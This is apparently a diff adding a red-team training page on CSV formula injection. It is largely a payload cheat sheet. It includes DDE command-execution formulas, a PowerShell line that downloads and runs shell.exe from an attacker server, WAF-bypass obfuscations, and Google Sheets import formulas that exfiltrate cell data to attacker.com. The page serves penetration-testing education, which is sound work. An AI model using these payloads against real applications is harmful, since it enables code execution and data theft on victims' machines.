@@ -1,0 +1,87 @@
+---
+layout: training-page
+title: "CSV Injection — Red Team Academy"
+module: "Web Hacking"
+tags:
+  - csv-injection
+  - formula-injection
+  - dde
+  - web
+page_key: "web-csv-injection"
+---
+<h1>CSV Injection</h1>
+<p>CSV Injection, also known as Formula Injection, occurs when a web application allows user-controlled data to be exported into a CSV file that a victim then opens in a spreadsheet application (Excel, LibreOffice, Google Sheets). Spreadsheet software interprets cells beginning with certain characters as formulas and executes them, potentially leading to remote code execution on the victim's machine or data exfiltration.</p>
+
+<h2>How It Works</h2>
+<p>Spreadsheet applications treat cells as formulas when they begin with any of these characters:</p>
+<pre><code>=
++
+-
+@</code></pre>
+<p>An attacker injects one of these prefixes into a field that gets stored and later exported in a CSV. When the victim opens the file, the formula executes.</p>
+
+<h2>Dynamic Data Exchange (DDE) Attacks</h2>
+<p>DDE is a legacy Windows inter-process communication protocol that Excel supports. When a DDE formula is processed, Excel launches an external process such as <code>cmd.exe</code>.</p>
+
+<h3>Spawn a Calculator (Proof of Concept)</h3>
+<pre><code>DDE ("cmd";"/C calc";"!A0")A0
+@SUM(1+1)*cmd|' /C calc'!A0
+=2+5+cmd|' /C calc'!A0
+=cmd|' /C calc'!'A1'</code></pre>
+
+<h3>PowerShell Download and Execute</h3>
+<pre><code>=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0</code></pre>
+
+<h3>Obfuscation and Command Chaining</h3>
+<p>These variants help bypass filters that look for the raw <code>cmd</code> string:</p>
+<pre><code>=AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A
+=cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A
+=         cmd|'/c calc.exe'!A</code></pre>
+
+<h3>Using rundll32 Instead of cmd</h3>
+<pre><code>=rundll32|'URL.dll,OpenURL calc.exe'!A
+=rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A</code></pre>
+
+<h3>Null Character Bypass</h3>
+<p>Null characters are ignored by the formula interpreter but break string-based WAF filters:</p>
+<pre><code>=    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A</code></pre>
+
+<h2>DDE Payload Anatomy</h2>
+<p>Breaking down <code>=cmd|'/C calc'!A0</code>:</p>
+<ul>
+  <li><code>cmd</code> — the DDE server name (the process to launch)</li>
+  <li><code>/C calc</code> — the DDE topic, passed as the command argument</li>
+  <li><code>!A0</code> — the DDE item; specifies the data unit the server should return</li>
+</ul>
+
+<h2>Google Sheets Data Exfiltration</h2>
+<p>Google Sheets supports URL-fetching formulas. These can be used for blind formula injection detection or out-of-band data exfiltration. The victim receives a warning prompt before the request fires, but many users click through.</p>
+<pre><code>=IMPORTXML("http://burp.collaborator.net/csv","//a/@href")
+=IMPORTDATA("http://attacker.com/log?data="&A1)
+=IMPORTFEED("http://attacker.com/collect")
+=IMPORTHTML("http://attacker.com/collect","table",1)</code></pre>
+<p>Available Google Sheets import functions:</p>
+<ul>
+  <li><code>IMPORTXML(url, xpath_query)</code> — Fetches and parses XML/HTML from URL</li>
+  <li><code>IMPORTRANGE(spreadsheet_url, range)</code> — Imports data from another spreadsheet</li>
+  <li><code>IMPORTHTML(url, query, index)</code> — Imports a table or list from an HTML page</li>
+  <li><code>IMPORTFEED(url)</code> — Imports an RSS or Atom feed</li>
+  <li><code>IMPORTDATA(url)</code> — Imports data from a CSV or TSV at a URL</li>
+</ul>
+
+<h2>Testing Methodology</h2>
+<p>Identify fields in the application that end up in CSV exports: usernames, first/last names, email addresses, addresses, comments, or any user-controlled string field. Inject a formula payload and trigger a CSV export, then open the file to observe behavior.</p>
+<pre><code># Simple detection payload — if executed, will make outbound DNS/HTTP
+=IMPORTXML(CONCAT("http://burp-collaborator.net/",SUBSTITUTE(A1," ","_")),"//a")
+
+# Detect in Excel via DDE — shows a calc popup on open
+=cmd|' /C calc'!'A1'</code></pre>
+
+<h2>Resources</h2>
+<ul>
+  <li>CSV Excel Macro Injection — OWASP — <code>owasp.org/www-community/attacks/CSV_Injection</code></li>
+  <li>CSV Formula Injection — Google Bug Hunter University — <code>bughunters.google.com/learn/invalid-reports/google-products/4965108570390528</code></li>
+  <li>From CSV to Meterpreter — Adam Chester — <code>blog.xpnsec.com/from-csv-to-meterpreter/</code></li>
+  <li>The Absurdly Underestimated Dangers of CSV Injection — George Mauer — <code>georgemauer.net/2017/10/07/csv-injection.html</code></li>
+  <li>Three New DDE Obfuscation Methods — ReversingLabs — <code>blog.reversinglabs.com/blog/cvs-dde-exploits-and-obfuscation</code></li>
+</ul>
